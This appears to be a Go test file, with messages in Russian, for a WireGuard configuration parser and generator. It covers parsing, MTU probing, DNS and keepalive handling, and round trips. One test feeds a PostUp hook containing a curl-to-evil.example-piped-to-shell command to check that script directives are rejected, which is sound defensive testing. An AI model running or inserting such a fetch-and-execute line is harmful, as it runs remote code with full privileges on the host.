package wggen

import (
	"net"
	"strings"
	"testing"
)

const (
	privKey = "6HrAtQNTBhaOAxo2rEyOEqYnLXQ5U8DdAxIQyfaFvV4="
	pubKey  = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg="
	pskKey  = "FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE="
)

func vendorConfig() string {
	return `# конфигурация от поставщика
[Interface]
PrivateKey = ` + privKey + `
Address = 10.66.66.2/32
DNS = 10.66.66.1
MTU = 1420

[Peer]
PublicKey = ` + pubKey + `
PresharedKey = ` + pskKey + `
AllowedIPs = 0.0.0.0/0
Endpoint = vpn.example.net:51820
PersistentKeepalive = 25
`
}

func TestParseVendorConfig(t *testing.T) {
	p, warnings, err := Parse(vendorConfig())
	if err != nil {
		t.Fatalf("разбор: %v", err)
	}
	if p.PrivateKey != privKey || p.Peer.PublicKey != pubKey || p.Peer.PresharedKey != pskKey {
		t.Fatal("ключи разобраны неверно")
	}
	if got := p.TunnelIPv4(); got != "10.66.66.2" {
		t.Fatalf("адрес туннеля: %q", got)
	}
	if p.Peer.EndpointHost != "vpn.example.net" || p.Peer.EndpointPort != 51820 {
		t.Fatalf("адрес сервера: %q:%d", p.Peer.EndpointHost, p.Peer.EndpointPort)
	}
	if p.MTU != 1420 || len(p.DNS) != 1 || p.DNS[0] != "10.66.66.1" {
		t.Fatalf("просьбы файла разобраны неверно: mtu=%d dns=%v", p.MTU, p.DNS)
	}
	if !p.FullTunnel() {
		t.Fatal("конфиг просит весь трафик в туннель, а FullTunnel говорит обратное")
	}
	if p.KeepaliveAssumed {
		t.Fatal("keepalive задан в файле — подстановка не нужна")
	}
	if len(warnings) != 0 {
		t.Fatalf("на чистом конфиге не должно быть предупреждений: %v", warnings)
	}
	meta := p.Meta()
	if meta.PeerKey != pubKey || !meta.FullTunnel || meta.ConfigMTU != 1420 {
		t.Fatalf("метаданные: %+v", meta)
	}
}

func TestGenerateGolden(t *testing.T) {
	p, _, err := Parse(vendorConfig())
	if err != nil {
		t.Fatal(err)
	}
	got := string(p.Generate(Render{MTU: 1412, EndpointAddr: "203.0.113.7"}))
	want := "[Interface]\n" +
		"PrivateKey = " + privKey + "\n" +
		"Address = 10.66.66.2/32\n" +
		"MTU = 1412\n" +
		"\n[Peer]\n" +
		"PublicKey = " + pubKey + "\n" +
		"PresharedKey = " + pskKey + "\n" +
		"AllowedIPs = 0.0.0.0/0\n" +
		"Endpoint = 203.0.113.7:51820\n" +
		"PersistentKeepalive = 25\n"
	if got != want {
		t.Fatalf("сгенерированный конфиг разошёлся с эталоном:\n--- получено ---\n%s\n--- ожидалось ---\n%s", got, want)
	}
	if strings.Contains(got, "DNS") {
		t.Fatal("в действующем файле не должно быть DNS= — разрешением имён распоряжается резолвер офиса")
	}
}

func TestGenerateAutoMTU(t *testing.T) {
	p, _, err := Parse(vendorConfig())
	if err != nil {
		t.Fatal(err)
	}
	got := string(p.Generate(Render{}))
	if strings.Contains(got, "MTU") {
		t.Fatalf("при авторасчёте строки MTU быть не должно:\n%s", got)
	}
	if !strings.Contains(got, "Endpoint = vpn.example.net:51820") {
		t.Fatalf("без разрешённого адреса пишем имя из файла:\n%s", got)
	}
}

func TestParseRefusesScriptDirectives(t *testing.T) {
	for _, key := range []string{"PostUp", "PreUp", "PostDown", "PreDown", "postup", "POSTUP"} {
		cfg := strings.Replace(vendorConfig(), "MTU = 1420",
			"MTU = 1420\n"+key+" = curl http://evil.example/x | sh", 1)
		_, _, err := Parse(cfg)
		if err == nil {
			t.Fatalf("%s: импорт обязан быть отклонён", key)
		}
		if !strings.Contains(err.Error(), "полными правами") {
			t.Fatalf("%s: текст отказа должен объяснять причину, получено %q", key, err.Error())
		}
	}
}

func TestParseUnknownKeyIsWarningNotError(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "MTU = 1420", "MTU = 1420\nQuantumMode = on", 1)
	p, warnings, err := Parse(cfg)
	if err != nil {
		t.Fatalf("неизвестный ключ не повод отказывать: %v", err)
	}
	if p.Peer.PublicKey != pubKey {
		t.Fatal("импорт должен продолжиться")
	}
	if !containsText(warnings, "QuantumMode") {
		t.Fatalf("о неизвестной настройке обязано быть предупреждение: %v", warnings)
	}
}

func TestParseManagedKeysSkipped(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "MTU = 1420",
		"MTU = 1420\nTable = off\nFwMark = 0x1234\nListenPort = 51820", 1)
	p, warnings, err := Parse(cfg)
	if err != nil {
		t.Fatalf("служебные ключи не повод отказывать: %v", err)
	}
	out := string(p.Generate(Render{}))
	for _, forbidden := range []string{"Table", "FwMark", "ListenPort"} {
		if strings.Contains(out, forbidden) {
			t.Fatalf("служебный ключ %s просочился в действующий файл:\n%s", forbidden, out)
		}
	}
	if len(warnings) < 3 {
		t.Fatalf("о каждом служебном ключе обязано быть предупреждение: %v", warnings)
	}
}

func TestParseKeepaliveAssumed(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "PersistentKeepalive = 25\n", "", 1)
	p, warnings, err := Parse(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if !p.KeepaliveAssumed || p.Peer.PersistentKeepalive != DefaultKeepalive {
		t.Fatalf("keepalive обязан подставляться: %d (assumed=%v)", p.Peer.PersistentKeepalive, p.KeepaliveAssumed)
	}
	if !containsText(warnings, "поддержания связи") {
		t.Fatalf("подстановка обязана быть видимой администратору: %v", warnings)
	}
}

func TestParseSplitTunnelWarns(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "AllowedIPs = 0.0.0.0/0", "AllowedIPs = 10.0.0.0/8, 192.0.2.0/24", 1)
	p, warnings, err := Parse(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if p.FullTunnel() {
		t.Fatal("это не полный туннель")
	}
	if !containsText(warnings, "не весь трафик") {
		t.Fatalf("о частичном туннеле обязано быть предупреждение: %v", warnings)
	}
}

func TestParseRejectsBroken(t *testing.T) {
	cases := map[string]string{
		"без ключа":          strings.Replace(vendorConfig(), "PrivateKey = "+privKey, "", 1),
		"битый ключ":         strings.Replace(vendorConfig(), privKey, "не-ключ", 1),
		"без адреса сервера": strings.Replace(vendorConfig(), "Endpoint = vpn.example.net:51820", "", 1),
		"порт вне границ":    strings.Replace(vendorConfig(), ":51820", ":70000", 1),
		"мусор вместо имени": strings.Replace(vendorConfig(), "vpn.example.net", "vpn example net$", 1),
		"адрес не адрес":     strings.Replace(vendorConfig(), "10.66.66.2/32", "не-адрес", 1),
		"строка без равно":   strings.Replace(vendorConfig(), "MTU = 1420", "просто строка", 1),
		"дубль настройки":    strings.Replace(vendorConfig(), "MTU = 1420", "MTU = 1420\nAddress = 10.0.0.2/32", 1),
	}
	for name, cfg := range cases {
		if _, _, err := Parse(cfg); err == nil {
			t.Errorf("%s: ожидался отказ", name)
		}
	}
}

func TestParseSingleAddressWithoutMask(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "Address = 10.66.66.2/32", "Address = 10.66.66.2", 1)
	p, _, err := Parse(cfg)
	if err != nil {
		t.Fatalf("адрес без маски — обычная запись: %v", err)
	}
	if p.Addresses[0] != "10.66.66.2/32" {
		t.Fatalf("адрес приведён неверно: %v", p.Addresses)
	}
}

func TestParseIPv6AddressWarns(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "Address = 10.66.66.2/32",
		"Address = 10.66.66.2/32, fd42::2/128", 1)
	_, warnings, err := Parse(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if !containsText(warnings, "IPv6") {
		t.Fatalf("об адресах нового поколения обязано быть предупреждение: %v", warnings)
	}
}

func TestParseTooBig(t *testing.T) {
	if _, _, err := Parse(strings.Repeat("a", MaxConfigBytes+1)); err == nil {
		t.Fatal("файл сверх потолка обязан быть отклонён")
	}
}

func TestSlug(t *testing.T) {
	cases := map[string]string{
		"Офис Киев":            "ofis-kiev",
		"vpn-vendor Premium 1": "vpn-vendor-premium-1",
		"   ":                  "profil",
		"!!!":                  "profil",
		"Очень длинное название профиля": "ochen-dlinnoe-nazvanie-p",
	}
	for in, want := range cases {
		if got := Slug(in); got != want {
			t.Errorf("Slug(%q) = %q, ожидалось %q", in, got, want)
		}
	}
	for _, s := range []string{"ofis-kiev", "a", "vpn1"} {
		if !ValidSlug(s) {
			t.Errorf("ValidSlug(%q) = false", s)
		}
	}
	for _, s := range []string{"", "-abc", "../etc", "ABC", "a b", strings.Repeat("a", 25)} {
		if ValidSlug(s) {
			t.Errorf("ValidSlug(%q) = true — это дыра в пути файла", s)
		}
	}
}

func TestTunnelMTU(t *testing.T) {
	cases := map[int]int{1500: 1440, 1492: 1432, 1400: 1340, 1300: MinMTU, 1: MinMTU}
	for path, want := range cases {
		if got := TunnelMTU(path); got != want {
			t.Errorf("TunnelMTU(%d) = %d, ожидалось %d", path, got, want)
		}
	}
}

func TestNextProbe(t *testing.T) {
	low, high := ProbeLow, ProbeHigh
	steps := 0
	for {
		mid := NextProbe(low, high)
		if mid == 0 {
			break
		}
		steps++
		if steps > 16 {
			t.Fatal("двоичный поиск не сходится")
		}

		if mid <= 1372 {
			low = mid
		} else {
			high = mid
		}
	}
	if low+ProbeHeader != 1400 {
		t.Fatalf("поиск нашёл %d, ожидался путь 1400", low+ProbeHeader)
	}
}

func containsText(list []string, sub string) bool {
	for _, s := range list {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

func TestParseRefusesFormatChangingKeys(t *testing.T) {
	for _, key := range []string{"Jc", "Jmin", "Jmax", "S1", "S2", "H1", "H4", "I1", "Itime", "jc", "JMIN"} {
		cfg := strings.Replace(vendorConfig(), "MTU = 1420", "MTU = 1420\n"+key+" = 4", 1)
		_, _, err := Parse(cfg)
		if err == nil {
			t.Fatalf("%s: файл с маскировкой обязан быть отклонён, а не принят с предупреждением", key)
		}
		if !strings.Contains(err.Error(), "маскировк") {
			t.Fatalf("%s: отказ обязан объяснять причину, получено %q", key, err.Error())
		}
	}

	if _, _, err := Parse(strings.Replace(vendorConfig(), "MTU = 1420", "MTU = 1420\nSomeFutureKey = 1", 1)); err != nil {
		t.Fatalf("терпимость к неизвестному нарушена: %v", err)
	}
}

func TestParseDNSSearchDomains(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "DNS = 10.66.66.1", "DNS = 10.66.66.1, 1.1.1.1, corp.local", 1)
	p, warnings, err := Parse(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if len(p.DNS) != 2 || p.DNS[0] != "10.66.66.1" || p.DNS[1] != "1.1.1.1" {
		t.Fatalf("серверы имён разобраны неверно: %v", p.DNS)
	}
	if !containsText(warnings, "домен поиска") {
		t.Fatalf("о домене поиска обязано быть честное предупреждение: %v", warnings)
	}
	if containsText(warnings, "непонятное значение") {
		t.Fatalf("домен поиска — не ошибка: %v", warnings)
	}

	_, w2, err := Parse(strings.Replace(vendorConfig(), "DNS = 10.66.66.1", "DNS = 10.66.66.1, ???", 1))
	if err != nil {
		t.Fatal(err)
	}
	if !containsText(w2, "непонятное значение") {
		t.Fatalf("мусор в строке серверов имён обязан быть помечен: %v", w2)
	}
}

func TestParseKeepaliveDisabledWarns(t *testing.T) {
	for _, v := range []string{"off", "0", "OFF"} {
		cfg := strings.Replace(vendorConfig(), "PersistentKeepalive = 25", "PersistentKeepalive = "+v, 1)
		p, warnings, err := Parse(cfg)
		if err != nil {
			t.Fatalf("%s: %v", v, err)
		}
		if p.Peer.PersistentKeepalive != 0 {
			t.Fatalf("%s: выбор файла обязан уважаться, получено %d", v, p.Peer.PersistentKeepalive)
		}
		if p.KeepaliveAssumed {
			t.Fatalf("%s: подставлять своё значение поверх явного выбора нельзя", v)
		}
		if !containsText(warnings, "отвечать не сразу") {
			t.Fatalf("%s: молчать об этом нельзя: %v", v, warnings)
		}
	}
}

func TestUsableEndpointRejectsServiceAddresses(t *testing.T) {
	bad := []string{"127.0.0.1", "0.0.0.0", "224.0.0.1", "169.254.1.1", "255.255.255.255", "::1"}
	for _, s := range bad {
		if UsableEndpoint(net.ParseIP(s)) {
			t.Errorf("служебный адрес %s принят как сервер подключения", s)
		}
	}
	good := []string{"203.0.113.7", "192.168.100.10", "10.8.0.1"}
	for _, s := range good {
		if !UsableEndpoint(net.ParseIP(s)) {
			t.Errorf("нормальный адрес %s отвергнут (сервер может стоять в локальной сети)", s)
		}
	}
	if !UsableEndpoint(nil) {
		t.Error("имя (не адрес) проверяется после разрешения, а не здесь")
	}
}

func TestConfigWithLoopbackEndpointIsRefused(t *testing.T) {
	cfg := strings.Replace(vendorConfig(), "vpn.example.net:51820", "127.0.0.1:51820", 1)
	if _, _, err := Parse(cfg); err == nil {
		t.Fatal("файл с петлёй вместо сервера принят — канал ушёл бы на сам шлюз")
	}
}

func TestLiveFileLeavesRoutesToAgent(t *testing.T) {
	p, _, err := Parse(vendorConfig())
	if err != nil {
		t.Fatal(err)
	}
	live := string(p.Generate(Render{Mark: 51820}))
	for _, want := range []string{"Table = off\n", "FwMark = 51820\n"} {
		if !strings.Contains(live, want) {
			t.Errorf("в действующем файле нет %q:\n%s", want, live)
		}
	}
	if canon := string(p.Generate(Render{})); strings.Contains(canon, "Table") || strings.Contains(canon, "FwMark") {
		t.Errorf("канонический файл несёт служебные строки:\n%s", canon)
	}
}

func TestCanonicalRoundTrip(t *testing.T) {
	variants := map[string]string{
		"как у поставщика":      vendorConfig(),
		"без keepalive":         strings.Replace(vendorConfig(), "PersistentKeepalive = 25\n", "", 1),
		"частичный туннель":     strings.Replace(vendorConfig(), "AllowedIPs = 0.0.0.0/0", "AllowedIPs = 10.0.0.0/8, 192.0.2.0/24", 1),
		"со служебными ключами": strings.Replace(vendorConfig(), "MTU = 1420", "MTU = 1420\nTable = off\nFwMark = 0x1234", 1),
		"без PresharedKey":      strings.Replace(vendorConfig(), "PresharedKey = "+pskKey+"\n", "", 1),
	}
	for name, cfg := range variants {
		p, first, err := Parse(cfg)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		canon := string(p.Generate(Render{}))
		again, warnings, err := Parse(canon)
		if err != nil {
			t.Fatalf("%s: канонический файл отвергнут: %v\n%s", name, err, canon)
		}
		if got := string(again.Generate(Render{})); got != canon {
			t.Errorf("%s: канонический файл нестабилен:\n%s\n---\n%s", name, canon, got)
		}
		for _, w := range warnings {
			if !containsText(first, w) {
				t.Errorf("%s: новое предупреждение после переноса: %q", name, w)
			}
		}
	}

	orig, _, _ := Parse(vendorConfig())
	fromCanon, _, _ := Parse(string(orig.Generate(Render{})))
	if m := fromCanon.Meta(); m.ConfigMTU != 0 || len(m.ConfigDNS) != 0 {
		t.Fatalf("просьбы файла попали в канонический файл: %+v — пересмотреть перенос профиля", m)
	}

	p, _, _ := Parse(vendorConfig())
	canon := string(p.Generate(Render{}))
	again, _, err := Parse(strings.Replace(canon, "51820", "51821", 1))
	if err != nil || string(again.Generate(Render{})) == canon {
		t.Fatal("сравнение канонических файлов не видит разницы")
	}
}
